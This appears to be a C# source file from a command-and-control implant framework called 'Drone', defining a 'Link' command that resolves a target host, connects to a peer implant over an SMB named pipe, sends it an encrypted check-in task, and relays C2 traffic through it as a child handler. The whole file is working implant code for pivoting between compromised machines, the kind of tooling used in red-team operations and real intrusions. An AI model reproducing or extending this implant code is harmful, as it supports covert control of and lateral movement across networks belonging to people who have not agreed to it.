using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

using Drone.Handlers;
using Drone.Models;

namespace Drone.Commands;

public sealed class Link : DroneCommand
{
    public override byte Command => 0x1E;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // must be hostname
        var target = task.Arguments[0];
        
        if (IPAddress.TryParse(target, out var address))
        {
            var entry = await Dns.GetHostEntryAsync(address);
            target = entry.HostName;
        }

        var pipeName = task.Arguments[1];
        
        var handler = new SmbHandler(target, pipeName);
        await handler.Connect();
        
        Drone.AddChildHandler(handler);
        
        // check-in task
        var tasks = new DroneTask[]
        {
            new()
            {
                Id = task.Id,
                Command = 0x01,
                Arguments = new[] { Drone.Metadata.Id }    
            }
        };

        var enc = Crypto.EncryptObject(tasks);
        
        await handler.SendMessages(new[]
        {
            new C2Message
            {
                Iv = enc.iv,
                Data = enc.data,
                Checksum = enc.checksum
            }
        });

        try
        {
            // blocks
            await handler.Start();
            await Drone.SendTaskComplete(task);
        }
        catch (Exception e)
        {
            await Drone.SendError(task, e.Message);
        }
        finally
        {
            Drone.RemoveChildHandler(handler);
        }
    }
}